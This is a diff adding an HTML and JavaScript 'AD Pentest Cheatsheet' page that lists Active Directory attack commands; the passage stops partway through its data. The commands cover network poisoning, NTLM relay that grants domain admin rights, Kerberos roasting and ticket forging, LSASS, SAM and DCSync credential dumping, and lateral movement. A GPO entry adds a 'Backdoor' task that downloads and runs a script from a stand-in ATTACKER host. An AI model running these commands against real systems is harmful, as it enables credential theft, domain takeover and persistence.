@@ -1,0 +1,1408 @@
+<!DOCTYPE html>
+<html lang="en" class="dark">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>AD Pentest Cheatsheet</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link
+    href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+    rel="stylesheet">
+  <script>
+    tailwind.config = {
+      darkMode: 'class',
+      theme: {
+        extend: {
+          fontFamily: {
+            sans: ['Inter', 'sans-serif'],
+            mono: ['JetBrains Mono', 'monospace'],
+          },
+          colors: {
+            hacker: {
+              50: '#f0fdf4',
+              100: '#dcfce7',
+              200: '#bbf7d0',
+              300: '#86efac',
+              400: '#4ade80',
+              500: '#22c55e',
+              600: '#16a34a',
+              700: '#15803d',
+              800: '#166534',
+              900: '#14532d',
+              950: '#052e16',
+            },
+            dark: {
+              bg: '#0a0a0a',
+              surface: '#121212',
+              border: '#27272a'
+            }
+          }
+        }
+      }
+    }
+  </script>
+  <style>
+    body {
+      background-color: #050505;
+      color: #e4e4e7;
+    }
+
+    ::-webkit-scrollbar {
+      width: 6px;
+      height: 6px;
+    }
+
+    ::-webkit-scrollbar-track {
+      background: #18181b;
+    }
+
+    ::-webkit-scrollbar-thumb {
+      background: #3f3f46;
+      border-radius: 4px;
+    }
+
+    ::-webkit-scrollbar-thumb:hover {
+      background: #52525b;
+    }
+
+    .scroll-mt-24 {
+      scroll-margin-top: 6rem;
+    }
+
+    .sub-scroll-mt {
+      scroll-margin-top: 8rem;
+    }
+
+    .nav-submenu-wrapper {
+      display: grid;
+      grid-template-rows: 0fr;
+      transition: grid-template-rows 0.3s ease-in-out;
+    }
+
+    .nav-submenu-wrapper.expanded {
+      grid-template-rows: 1fr;
+    }
+
+    .nav-submenu-inner {
+      overflow: hidden;
+    }
+
+    .glitch-link {
+      position: relative;
+      display: inline-block;
+    }
+
+    .glitch-link:hover {
+      animation: glitch 0.3s infinite;
+    }
+
+    @keyframes glitch {
+      0% {
+        text-shadow: 2px 2px 0 rgba(34, 197, 94, 0.5), -2px -2px 0 rgba(59, 130, 246, 0.5);
+        transform: translate(0);
+      }
+
+      25% {
+        text-shadow: -2px 2px 0 rgba(59, 130, 246, 0.5), 2px -2px 0 rgba(34, 197, 94, 0.5);
+        transform: translate(-1px, 1px);
+      }
+
+      50% {
+        text-shadow: 2px -2px 0 rgba(34, 197, 94, 0.5), -2px 2px 0 rgba(59, 130, 246, 0.5);
+        transform: translate(1px, -1px);
+      }
+
+      75% {
+        text-shadow: -2px -2px 0 rgba(59, 130, 246, 0.5), 2px 2px 0 rgba(34, 197, 94, 0.5);
+        transform: translate(-1px, -1px);
+      }
+
+      100% {
+        text-shadow: 2px 2px 0 rgba(34, 197, 94, 0.5), -2px -2px 0 rgba(59, 130, 246, 0.5);
+        transform: translate(0);
+      }
+    }
+  </style>
+</head>
+<!-- references:
+		https://hackviser.com/tactics/tools
+		https://notes.benheater.com/books/active-directory
+		-->
+
+<body class="min-h-screen bg-dark-bg text-zinc-300 font-sans selection:bg-hacker-900 selection:text-white">
+
+  <nav
+    class="fixed top-0 left-0 right-0 h-16 bg-dark-bg/95 backdrop-blur-md border-b border-zinc-800 z-50 px-4 flex items-center justify-between lg:hidden">
+    <div class="flex items-center space-x-2 text-white font-bold">
+      <i data-lucide="shield" class="text-hacker-500 w-6 h-6"></i>
+      <span class="tracking-tight">AD Pentest</span>
+    </div>
+    <button id="mobile-menu-btn" class="p-2 text-zinc-400 hover:text-white transition-colors">
+      <i data-lucide="menu" class="w-6 h-6"></i>
+    </button>
+  </nav>
+
+  <aside id="sidebar"
+    class="fixed inset-y-0 left-0 w-80 bg-dark-surface border-r border-dark-border transform transition-transform duration-200 ease-in-out z-40 -translate-x-full lg:translate-x-0 flex flex-col">
+    <div class="h-16 flex-none flex items-center px-6 border-b border-dark-border bg-dark-surface z-10">
+      <i data-lucide="shield" class="text-hacker-500 mr-3 w-6 h-6"></i>
+      <span class="font-bold text-lg text-white tracking-tight">AD Pentest <span
+          class="text-xs text-zinc-500 bg-zinc-900 px-1.5 py-0.5 rounded border border-zinc-800 ml-1">v1</span></span>
+    </div>
+
+    <div class="p-4 flex-none">
+      <div class="relative">
+        <i data-lucide="search" class="absolute left-3 top-1/2 transform -translate-y-1/2 text-zinc-500 w-4 h-4"></i>
+        <input type="text" id="search-input" placeholder="Search commands..."
+          class="w-full bg-zinc-900 border border-zinc-800 text-sm text-zinc-300 rounded-md py-2 pl-9 pr-3 focus:outline-none focus:border-hacker-500 focus:ring-1 focus:ring-hacker-500 transition-all placeholder-zinc-600" />
+      </div>
+    </div>
+
+    <nav id="nav-container" class="flex-1 overflow-y-auto px-3 pb-6 space-y-1">
+    </nav>
+
+    <div class="p-4 border-t border-dark-border flex-none">
+      <div class="text-xs text-zinc-600 text-center">
+        AD Cheatsheet By <a href="https://github.com/karthikparambil" target="_blank"
+          class="glitch-link text-hacker-500 hover:text-hacker-400 transition-colors">@karthikparambil</a>
+      </div>
+    </div>
+  </aside>
+
+  <main class="lg:pl-80 pt-20 lg:pt-8 px-4 lg:px-12 pb-24 max-w-7xl mx-auto">
+    <div id="content-container">
+    </div>
+
+    <div id="empty-state" class="hidden flex flex-col items-center justify-center py-20 text-zinc-500">
+      <i data-lucide="search" class="w-12 h-12 mb-4 opacity-20"></i>
+      <p class="text-lg">No results found.</p>
+    </div>
+
+    <footer class="mt-20 pt-8 border-t border-dark-border text-center text-zinc-500 text-sm">
+      <p>Created for Security Professionals. Use Responsibly.</p>
+    </footer>
+  </main>
+
+  <script>
+    const CHEATSHEET_DATA = [
+      {
+        id: 'basics',
+        title: 'AD Basics',
+        icon: 'shield',
+        content: [
+          {
+            title: 'Core Concepts',
+            type: 'card',
+            objective: 'Understand the fundamental components of an AD environment',
+            list: [
+              'LDAP: Protocol used to query and modify AD directory services (ports 389/636)',
+              'Kerberos: Primary authentication protocol in AD (port 88); uses tickets instead of passwords',
+              'NTLM: Legacy challenge-response authentication protocol; still used as fallback',
+              'LLMNR: Name resolution protocol when dns fails',
+              'NBT-NS: NetBIOS name service for name resolution',
+              'SPN: Maps a service to a user or computer account',
+            ]
+          }
+        ]
+      },
+      {
+        id: 'network-poisoning',
+        title: 'Network Poisoning Attacks',
+        icon: 'radio',
+        content: [
+          {
+            title: 'LLMNR/NBT-NS/WPAD Poisoning',
+            objective: 'Intercept name resolution requests to capture credentials',
+            commands: [
+              { label: 'Responder', cmd: 'responder -I wlan0 -dwv' },
+            ]
+          },
+          {
+            title: 'SMB Relay Attacks',
+            objective: 'Relays captured NTLM auth to other services. Note: disable SMB & HTTP in responder.conf',
+            commands: [
+              { label: 'Identify targets without SMB signing', cmd: 'crackmapexec smb 192.168.1.0/24 --gen-relay-list targets.txt' },
+              { label: 'SMB relay to SMB', cmd: 'impacket-ntlmrelayx -tf targets.txt -smb2support ~i' },
+              { label: 'SMB relay to LDAP (create new domain admin)', cmd: 'impacket-ntlmrelayx -t ldap://DC-IP --escalate-user lowpriv-user' },
+              { label: 'SMB relay to LDAPS (bypass LDAP signing)', cmd: 'impacket-ntlmrelayx -t ldaps://DC-IP --escalate-user lowpriv-user' },
+            ]
+          },
+          {
+            title: 'IPv6 DNS Takeover',
+            objective: 'Act as DNS/gateway and become man-in-the-middle inside AD.',
+            commands: [
+              { label: 'mitm6 (Terminal 1)', cmd: 'mitm6 -d <DOMAIN>' },
+              { label: 'ntlmrelayx (Terminal 2)', cmd: 'impacket-ntlmrelayx -6 -t ldaps://DC-IP -wh fakewpad.DOMAIN.LOCAL -l lootd' },
+            ]
+          },
+          {
+            title: 'LDAP Pass-Back attack',
+            objective: 'Act as LDAP server and become man-in-the-middle inside AD.',
+            commands: [
+              { label: 'Force plaintext authentication ', cmd: 'sudo ldapmodify -Y EXTERNAL -H ldapi:// -f ./olcSaslSecProps.ldif' },
+              { label: 'tcpdump', cmd: 'sudo tcpdump -SX -i breachad tcp port 389' },
+            ]
+          }
+        ]
+      },
+      {
+        id: 'initial-enum',
+        title: 'Initial Enumeration',
+        icon: 'search',
+        content: [
+          {
+            title: 'Nmap Enumeration',
+            objective: 'Comprehensive enum scan ',
+            commands: [
+              { label: 'Common Port Scan', cmd: 'nmap -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,5986,9389,47001,49152-65535 -sV <TARGET_IP>' },
+              { label: 'Identify Domain Controllers', cmd: 'nmap -p 389,636,88,3268 <TARGET_IP>/24' },
+              { label: 'Fast comprehensive scan', cmd: 'nmap -p 53,88,123,135,137-139,389,445,464,593,636,3268-3269,3389,5722,5985-5986,9389,47001 -sV -sC --script "ldap*,smb*,krb5*,msrpc*,dns*" -T4 <TARGET_IP>' },
+              { label: 'UDP Scan', cmd: 'nmap -sU --top-ports 200 <TARGET_IP>' },
+            ]
+          },
+          {
+            title: 'Impacket Enumeration',
+            objective: 'Identify users and SIDs',
+            commands: [
+              { label: 'GetNPUsers - AS-REP Roasting', cmd: 'impacket-GetNPUsers <DOMAIN>/ -dc-ip <DC_IP> -usersfile users.txt -format hashcat' },
+              { label: 'SID Bruteforce (User Discovery)', cmd: 'impacket-lookupsid -no-pass <DOMAIN>/<IP>' },
+              { label: 'LDAP Anonymous Enumeration', cmd: 'impacket-GetADUsers -no-pass -dc-ip <TARGET_IP> <DOMAIN>/' },
+            ]
+          },
+          {
+            title: 'Enum4linux-ng Enumeration',
+            objective: 'Comprehensive enum scan ',
+            commands: [
+              { label: 'Enum4Linux', cmd: 'enum4linux-ng -A <TARGET_IP>' },
+
+            ]
+          },
+
+          {
+            title: 'SMB Enumeration',
+            objective: 'Map accessible file shares and valid user accounts',
+            commands: [
+              { label: 'Nmap Scripts', cmd: 'nmap -p 445 --script smb-enum-shares,smb-enum-users,smb-vuln* <TARGET_IP>' },
+              { label: 'netexec Shares', cmd: 'nxc smb <TARGET_IP>/24 --shares' },
+              { label: 'SMBClient', cmd: 'smbclient -L //<TARGET_IP> -N' }
+            ]
+          },
+          {
+            title: 'LDAP Enumeration',
+            objective: 'Extract directory information without authentication',
+            commands: [
+              { label: 'Nmap LDAP', cmd: 'nmap -p 389 --script ldap-rootdse <TARGET_IP>' },
+              { label: 'LDAP Search', cmd: 'ldapsearch -x -H ldap://<TARGET_IP> -s base namingcontexts' },
+              { label: 'LDAP anonymous bind', cmd: 'ldapsearch -x -H ldap://<TARGET_IP> -b "" -s base' },
+            ]
+          },
+          {
+            title: 'RPC Enumeration',
+            commands: [
+              { label: 'Enumerate users', cmd: 'rpcclient -U "" -N <TARGET_IP>' },
+              { cmd: 'enumdomusers' },
+              { cmd: 'enumdomgroups' },
+              { cmd: 'netshareenum' },
+              { cmd: 'enumlocals' },
+              { cmd: 'enumdomusers' },
+              { cmd: 'srvinfo' },
+              { label: 'RPC dump', cmd: 'rpcinfo -p <TARGET_IP>' },
+              { label: 'Impacket samrdump', cmd: 'impacket-samrdump <TARGET_IP>' },
+
+            ]
+          }
+        ]
+      },
+      {
+        id: 'service-vulnerability',
+        title: 'Service Vulnerability',
+        icon: 'alert-triangle',
+        content: [
+          {
+            title: 'Vulnerability Scanning',
+            objective: 'Identify vulnerable services and configurations',
+            commands: [
+              { label: 'Basic Scan', cmd: 'nmap -sC -sV --script vuln -oA vuln_scan <TARGET_IP>' },
+              { label: 'Aggressive Scan', cmd: 'nmap -A -T4 <TARGET_IP>' },
+              { label: 'SMB Vulnerabilities', cmd: 'nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-ms08-067 <TARGET_IP>' },
+              { label: 'LDAP Anonymous Bind', cmd: 'nmap -p 389 --script ldap-anonymous-bind <DC_IP>' },
+              { label: 'RDP Vulnerabilities', cmd: 'nmap -p 3389 --script rdp-vuln-ms12-020 <TARGET_IP>' },
+            ]
+          },
+          {
+            title: 'Web Service Vulnerabilities',
+            objective: 'Test web applications and services for common vulnerabilities',
+            commands: [
+              { label: 'Web App Scan', cmd: 'nmap -p 80,443,8080 --script http-enum <TARGET_IP>' },
+              { label: 'IIS Vulnerabilities', cmd: 'nmap -p 80,443 --script http-iis-webdav-vuln <TARGET_IP>' },
+              { label: 'Apache Struts', cmd: 'nmap -p 8080 --script http-vuln-cve2017-5638 <TARGET_IP>' },
+              { label: 'WebDAV Detection', cmd: 'nmap -p 80,443 --script http-webdav-scan <TARGET_IP>' }
+            ]
+          },
+          {
+            title: 'Database Vulnerabilities',
+            objective: 'Identify database service vulnerabilities',
+            commands: [
+              { label: 'MySQL Enum', cmd: 'nmap -p 3306 --script mysql-info <TARGET_IP>' },
+              { label: 'MSSQL Enum', cmd: 'nmap -p 1433 --script ms-sql-info <TARGET_IP>' },
+              { label: 'Oracle Enum', cmd: 'nmap -p 1521 --script oracle-enum-users <TARGET_IP>' },
+              { label: 'PostgreSQL Enum', cmd: 'nmap -p 5432 --script pgsql-info <TARGET_IP>' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'kerberos',
+        title: 'Kerberos Attacks',
+        icon: 'key',
+        content: [
+          {
+            title: 'Golden Ticket Attack',
+            objective: 'Create a forged Kerberos TGT using the KRBTGT account hash.',
+            commands: [
+              { label: 'Mimikatz', cmd: 'mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /id:500 /ptt" exit' },
+              { label: 'Impacket', cmd: 'impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> Administrator' },
+              { label: 'Rubeus', cmd: 'Rubeus.exe ptt /ticket:ticket.kirbi' },
+            ]
+          },
+          {
+            title: 'Silver Ticket Attack',
+            objective: 'Forge a Service Ticket (TGS) to access a specific resource.',
+            commands: [
+              { label: 'Mimikatz', cmd: 'mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /target:<TARGET_COMPUTER> /service:<SERVICE_NAME> /rc4:<MACHINE_HASH> /user:Administrator /ptt" exit' },
+              { label: 'Impacket', cmd: 'impacket-ticketer -nthash <MACHINE_HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_SPN> Administrator' },
+            ]
+          },
+          {
+            title: 'AS-REP Roasting',
+            objective: 'Crack hashes of users with pre-auth disabled',
+            description: 'Attacking users with "Do not require Kerberos preauthentication" enabled.',
+            commands: [
+              { label: 'Impacket (No Auth)', cmd: 'impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip <DC_IP>' },
+              { label: 'Impacket (Auth)', cmd: "impacket-GetNPUsers DOMAIN/USERNAME:'PASSWORD' -request -dc-ip <DC_IP>" },
+              { label: 'Rubeus', cmd: 'Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt' },
+              { label: 'Hashcat Mode 18200', cmd: 'hashcat -m 18200 hashes.txt wordlist.txt' }
+            ]
+          },
+          {
+            title: 'Kerberoasting',
+            objective: 'Request and crack service account tickets (TGS)',
+            description: 'Requesting service tickets for service accounts and cracking them offline.',
+            commands: [
+              { label: 'Impacket', cmd: "impacket-GetUserSPNs DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -request" },
+              { label: 'Rubeus', cmd: 'Rubeus.exe kerberoast /outfile:hashes.txt' },
+              { label: 'Hashcat Mode 13100', cmd: 'hashcat -m 13100 hashes.txt wordlist.txt' }
+            ]
+          },
+          {
+            title: 'Ticket Reuse (PTT)',
+            objective: 'Impersonate users using stolen Kerberos tickets',
+            commands: [
+              { label: 'Mimikatz Export', cmd: 'mimikatz.exe "sekurlsa::tickets /export" exit' },
+              { label: 'Convert Kirbi to Ccache', cmd: 'impacket-ticketConverter ticket.kirbi ticket.ccache' },
+              { label: 'Use Ticket', cmd: 'export KRB5CCNAME=/path/to/ticket.ccache\nimpacket-psexec DOMAIN/USERNAME@<TARGET> -k -no-pass' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'workflow',
+        title: 'Attack Workflow',
+        icon: 'play-circle',
+        content: [
+          {
+            title: 'Domain Username + NTLM Hash',
+            type: 'workflow',
+            objective: 'Authenticate or move laterally using captured hashes',
+            description: 'You can authenticate via Pass-the-Hash, enumerate resources, or move laterally.',
+            commands: [
+              { label: 'List Shares', cmd: 'crackmapexec smb <DC_IP> -u USERNAME -H <NTLM_HASH> --shares' },
+              { label: 'List Users', cmd: 'crackmapexec smb <DC_IP> -u USERNAME -H <NTLM_HASH> --users' },
+              { label: 'PsExec Lateral Move', cmd: 'impacket-psexec DOMAIN/USERNAME@<TARGET_IP> -hashes :<NTLM_HASH>' },
+              { label: 'Dump Secrets', cmd: 'impacket-secretsdump DOMAIN/USERNAME@<DC_IP> -hashes :<NTLM_HASH>' }
+            ],
+            notes: ['If blocked: Try Kerberoasting, BloodHound, or Delegation abuse.']
+          },
+          {
+            title: 'Domain User + Cleartext Pass',
+            type: 'workflow',
+            objective: 'Perform full enumeration and request TGTs',
+            description: 'You can perform full enumeration, request TGTs, and access owned systems.',
+            commands: [
+              { label: 'List Shares', cmd: "crackmapexec smb <SUBNET> -u USERNAME -p 'PASSWORD' --shares" },
+              { label: 'BloodHound Collection', cmd: "bloodhound-python -u USERNAME -p 'PASSWORD' -d DOMAIN.COM -dc DC.DOMAIN.COM -ns <DC_IP> -c All --zip" },
+              { label: 'Kerberoast', cmd: "impacket-GetUserSPNs DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP> -request" },
+              { label: 'WinRM Check', cmd: "crackmapexec winrm <SUBNET> -u USERNAME -p 'PASSWORD'" }
+            ]
+          },
+          {
+            title: 'Kerberos TGT / TGS Ticket',
+            type: 'workflow',
+            objective: 'Pass-the-Ticket to bypass NTLM authentication',
+            description: 'You can Pass-the-Ticket, request service tickets, and bypass NTLM.',
+            commands: [
+              { label: 'Export Ticket', cmd: 'export KRB5CCNAME=/path/to/ticket.ccache' },
+              { label: 'PsExec (No Pass)', cmd: 'impacket-psexec DOMAIN/USERNAME@<TARGET> -k -no-pass' },
+              { label: 'Secrets Dump', cmd: 'impacket-secretsdump DOMAIN/USERNAME@<DC> -k -no-pass' },
+              { label: 'CrackMapExec Kerberos', cmd: 'crackmapexec smb <TARGET> --kerberos' }
+            ]
+          },
+          {
+            title: 'Local Admin NTLM Hash',
+            type: 'workflow',
+            objective: 'Dump local credentials and secrets (SAM/LSA)',
+            description: 'Authenticate as local admin to dump SAM, LSA secrets, and LSASS.',
+            commands: [
+              { label: 'Dump SAM', cmd: 'crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth --sam' },
+              { label: 'Dump LSA', cmd: 'crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth --lsa' },
+              { label: 'Secrets Dump', cmd: 'impacket-secretsdump -hashes :<NTLM_HASH> Administrator@<TARGET_IP>' },
+              { label: 'Dump LSASS (LSASSY)', cmd: 'crackmapexec smb <TARGET_IP> -u Administrator -H <NTLM_HASH> --local-auth -M lsassy' }
+            ]
+          },
+          {
+            title: 'Machine Account (Computer$)',
+            type: 'workflow',
+            objective: 'Exploit RBCD or ADCS using machine privileges',
+            description: 'Exploit RBCD or perform ADCS attacks.',
+            commands: [
+              { label: 'Get Service Ticket', cmd: 'impacket-getST DOMAIN/COMPUTER$ -hashes :<NTLM_HASH> -spn cifs/<TARGET>' },
+              { label: 'RBCD Setup', cmd: 'impacket-rbcd DOMAIN/COMPUTER$ -hashes :<NTLM_HASH> -delegate-to COMPUTER$ -dc-ip <DC_IP>' },
+              { label: 'BloodHound w/ Machine', cmd: "crackmapexec ldap <DC_IP> -u 'COMPUTER$' -H <NTLM_HASH> --bloodhound -c all" }
+            ]
+          },
+          {
+            title: 'Domain Admin Credentials',
+            type: 'workflow',
+            objective: 'Establish domain dominance and persistence',
+            description: 'Game over. DCSync, Golden Tickets, Persistence.',
+            commands: [
+              { label: 'DCSync', cmd: "impacket-secretsdump DOMAIN/ADMIN:'PASSWORD'@<DC_IP> -just-dc" },
+              { label: 'PsExec DC', cmd: 'impacket-psexec DOMAIN/ADMIN@<DC_IP> -hashes :<NTLM_HASH>' },
+              { label: 'Create Golden Ticket', cmd: 'impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <SID> -domain DOMAIN.COM Administrator' },
+              { label: 'GPP Password Hunt', cmd: "crackmapexec smb <DC_IP> -u ADMIN -p 'PASSWORD' -M gpp_password" }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'enumeration',
+        title: 'User Enumeration',
+        icon: 'database',
+        content: [
+          {
+            title: 'Domain Users',
+            objective: 'Identify valid domain user accounts',
+            commands: [
+
+              { label: 'NetExec', cmd: "nxc smb <DC_IP> -u USERNAME -p 'PASSWORD' --users" },
+              { label: 'Impacket', cmd: "impacket-GetADUsers -all DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP>" },
+              { label: 'Users In Current Machine', cmd: 'net user' },
+              { label: 'Users In Domain', cmd: 'net user /domain' },
+              { label: 'User Information', cmd: 'net user USERNAME' },
+              { label: 'User Information From Domain', cmd: 'net user USERNAME /domain' },
+
+            ]
+          },
+          {
+            title: 'Group Enumeration',
+            objective: 'Identify valid domain group accounts',
+            commands: [
+
+              { label: 'NetExec', cmd: "nxc smb <DC_IP> -u USERNAME -p 'PASSWORD' --groups" },
+              { label: 'Impacket', cmd: "impacket-GetADGroups -all DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP>" },
+              { label: 'Groups In Domain', cmd: 'net group /domain' },
+              { label: 'Group Information', cmd: 'net group GROUPNAME' },
+              { label: 'Group Information From Domain', cmd: 'net group GROUPNAME /domain' },
+              { label: 'Local Admin Group', cmd: 'net localgroup administrators' },
+              { label: 'RDP access users', cmd: 'net localgroup "Remote Desktop Users"' },
+              { label: 'High-value groups', cmd: 'net group "Domain Admins" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Enterprise Admins" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Schema Admins" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Account Operators" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Server Operators" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Print Operators" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Backup Operators" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Domain Controllers" /domain' },
+              { label: 'High-value groups', cmd: 'net group "DNSAdmins" /domain' },
+              { label: 'High-value groups', cmd: 'net group "Group Policy Creator Owners" /domain' },
+
+            ]
+          },
+          {
+            title: 'Host Enumeration',
+            objective: 'Identify valid domain computer accounts',
+            commands: [
+              { label: 'NetExec', cmd: "nxc smb <DC_IP> -u USERNAME -p 'PASSWORD' --computers" },
+              { label: 'Impacket', cmd: "impacket-GetADComputer -all DOMAIN/USERNAME:'PASSWORD' -dc-ip <DC_IP>" },
+              { label: 'List all domains', cmd: 'net view /domain' },
+              { label: 'List computers in current domain', cmd: 'net view' },
+              { label: 'List computers in domain', cmd: 'net view /domain:DOMAIN' },
+
+
+
+            ]
+          },
+          {
+            title: 'Logged-in Users (Admin)',
+            objective: 'Locate where high-privilege users are logged in',
+            commands: [
+              { label: 'CME Sessions', cmd: "crackmapexec smb <TARGET> -u USERNAME -p 'PASSWORD' --sessions" },
+              { label: 'Net Sessions', cmd: 'net sessions \\\\<TARGET>' }
+            ]
+          },
+          {
+            title: 'High-Value Groups',
+            objective: 'Identify privileged groups (DA, EA)',
+            commands: [
+              { label: 'Domain Admins', cmd: 'net group "Domain Admins" /domain' },
+              { label: 'Enterprise Admins', cmd: 'net group "Enterprise Admins" /domain' },
+              { label: 'PowerView', cmd: 'Get-DomainGroup -Identity "Domain Admins" | Get-DomainGroupMember' }
+            ]
+          },
+          {
+            title: 'ACL Discovery',
+            objective: 'Find interesting Access Control Lists and paths',
+            commands: [
+              { label: 'BloodHound', cmd: "bloodhound-python -u USERNAME -p 'PASSWORD' -d DOMAIN.COM -dc DC.DOMAIN.COM -c all" },
+              { label: 'PowerView Interesting ACLs', cmd: 'Find-InterestingDomainAcl -ResolveGUIDs' },
+              { label: 'PowerView Object ACL', cmd: 'Get-ObjectAcl -SamAccountName "USERNAME" -ResolveGUIDs' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'credential-access',
+        title: 'Credential Access',
+        icon: 'lock',
+        content: [
+          {
+            title: 'LSASS Dumping',
+            objective: 'Extract cleartext credentials from memory',
+            commands: [
+              { label: 'CME LSASSY', cmd: "crackmapexec smb <TARGET> -u USERNAME -p 'PASSWORD' -M lsassy" },
+              { label: 'Impacket Remote', cmd: "impacket-secretsdump DOMAIN/USERNAME:'PASSWORD'@<TARGET>" },
+              { label: 'Mimikatz Local', cmd: 'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit' }
+            ]
+          },
+          {
+            title: 'Token & Ticket Extraction',
+            objective: 'Steal access tokens from running processes',
+            commands: [
+              { label: 'Rubeus Triage', cmd: 'Rubeus.exe triage' },
+              { label: 'Rubeus Dump', cmd: 'Rubeus.exe dump /luid:0x<LUID> /nowrap' },
+              { label: 'Mimikatz Tokens', cmd: 'mimikatz.exe "privilege::debug" "token::elevate" "token::list" exit' },
+              { label: 'Metasploit Incognito', cmd: 'load incognito\nlist_tokens -u\nimpersonate_token DOMAIN\\\\USERNAME' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'privesc',
+        title: 'Privilege Escalation',
+        icon: 'alert-triangle',
+        content: [
+          {
+            title: 'Misconfigured ACLs',
+            objective: 'Exploit weak permissions to gain control over objects',
+            commands: [
+              { label: 'PowerView Writable', cmd: 'Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "USERNAME"}' },
+              { label: 'Abuse GenericAll (User)', cmd: 'Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $newpass' },
+              { label: 'Abuse GenericAll (Computer)', cmd: "Set-DomainObject -Identity TARGET_COMPUTER$ -Set @{serviceprincipalname='HTTP/fake'}" }
+            ]
+          },
+          {
+            title: 'Delegation Abuse',
+            objective: 'Impersonate users via delegation rights',
+            commands: [
+              { label: 'Find Unconstrained', cmd: 'Get-DomainComputer -Unconstrained' },
+              { label: 'Rubeus Monitor', cmd: 'Rubeus.exe monitor /interval:5' },
+              { label: 'Constrained Delegation', cmd: "impacket-getST DOMAIN/SERVICE_ACCOUNT:'PASSWORD' -spn cifs/<TARGET> -impersonate Administrator" }
+            ]
+          },
+          {
+            title: 'GPO Abuse',
+            objective: 'Push malicious policies to execute code',
+            commands: [
+              { label: 'SharpGPOAbuse', cmd: 'SharpGPOAbuse.exe --AddLocalAdmin --UserAccount USERNAME --GPOName "TARGET GPO"' },
+              { label: 'New Immediate Task', cmd: 'New-GPOImmediateTask -TaskName "Backdoor" -GPODisplayName "TARGET GPO" -CommandArguments "-Command IEX(New-Object Net.WebClient).DownloadString(\'http://ATTACKER/shell.ps1\')"' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'lateral-movement',
+        title: 'Lateral Movement',
+        icon: 'network',
+        content: [
+          {
+            title: 'SMB (Port 445)',
+            objective: 'Execute code on remote hosts via SMB',
+            commands: [
+              { label: 'PsExec', cmd: "impacket-psexec DOMAIN/USERNAME:'PASSWORD'@<TARGET>" },
+              { label: 'SMBExec (Stealth)', cmd: "impacket-smbexec DOMAIN/USERNAME:'PASSWORD'@<TARGET>" },
+              { label: 'CME Exec', cmd: "crackmapexec smb <TARGET> -u USERNAME -p 'PASSWORD' -x \"whoami\"" }
+            ]
+          },
+          {
+            title: 'WinRM (Port 5985/5986)',
+            objective: 'Remote management shell access',
+            commands: [
+              { label: 'Evil-WinRM', cmd: "evil-winrm -i <TARGET> -u USERNAME -p 'PASSWORD'" },
+              { label: 'CME WinRM', cmd: "crackmapexec winrm <TARGET> -u USERNAME -p 'PASSWORD' -x \"whoami\"" }
+            ]
+          },
+          {
+            title: 'RDP (Port 3389)',
+            objective: 'Remote GUI access to target',
+            commands: [
+              { label: 'XFreeRDP PTH', cmd: 'xfreerdp /u:USERNAME /pth:<NTLM_HASH> /v:<TARGET>' },
+              { label: 'XFreeRDP', cmd: "xfreerdp /u:USERNAME /p:'PASSWORD' /v:<TARGET> /cert-ignore" }
+            ]
+          },
+          {
+            title: 'Switch User (RunAs)',
+            objective: 'Switch to a different user context on the same machine',
+            commands: [
+              { label: 'CMD', cmd: 'runas /user:<DOMAIN>\\<USERNAME> cmd' },
+              { label: 'PowerShell (Interactive)', cmd: 'Start-Process powershell -Credential (Get-Credential)' },
+              { label: 'PowerShell (Non-Interactive)', cmd: '$pass = ConvertTo-SecureString "<PASSWORD>" -AsPlainText -Force; $cred = New-Object System.Management.Automation.PSCredential("<DOMAIN>\\<USERNAME>", $pass); Start-Process powershell -Credential $cred' }
+            ]
+          }
+        ]
+      },
+      {
+        id: 'domain-dominance',
+        title: 'Domain Dominance',
+        icon: 'terminal',
+        content: [
+          {
+            title: 'DCSync',
+            objective: 'Replicate domain secrets (Game Over)',
+            commands: [
+              { label: 'Impacket', cmd: "impacket-secretsdump DOMAIN/USERNAME:'PASSWORD'@<DC_IP> -just-dc" },
+              { label: 'Mimikatz', cmd: 'mimikatz.exe "lsadump::dcsync /domain:DOMAIN.COM /all /csv" exit' }
+            ]
+          },
+          {
+            title: 'Golden Ticket',
+            objective: 'Forge a TGT for unlimited access (Persistence)',
+            commands: [
+              { label: 'Ticketer', cmd: 'impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid <DOMAIN_SID> -domain DOMAIN.COM Administrator' },
